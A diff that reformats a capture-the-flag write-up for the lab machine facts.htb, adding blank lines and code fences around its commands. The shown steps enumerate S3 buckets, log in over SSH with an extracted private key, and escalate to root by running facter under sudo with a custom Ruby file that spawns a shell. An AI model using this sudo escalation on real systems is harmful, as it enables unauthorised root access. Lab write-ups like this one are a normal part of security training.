@@ -74,6 +74,7 @@ This allowed access to an internal S3 environment.
 
 📦 S3 Bucket Access
 Enumerate Buckets
+
 ```bash
 aws --endpoint-url http://facts.htb:54321 s3 ls
 ```
@@ -88,7 +89,9 @@ chmod 600 id_ed25519
 
 Login using extracted key:
 
+```bash
 ssh -i id_ed25519 trivia@facts.htb
+```
 
 Passphrase:
 
@@ -98,16 +101,19 @@ Result:
 
 User shell access obtained
 👤 User Flag
+
 ```bash
 cat /home/william/user.txt
 ```
 
 ⚡ Privilege Escalation {#priv}
+
 ```bash
 Sudo Check
 sudo -l
 ```
 Vulnerable Command
+
 ```bash
 sudo /usr/bin/facter --custom-dir /tmp
 ```
@@ -120,6 +126,7 @@ echo 'exec("/bin/sh")' > /tmp/x.rb
 sudo /usr/bin/facter --custom-dir /tmp
 ```
 👑 Root Access {#root}
+
 ```bash
 cat /root/root.txt
 ```
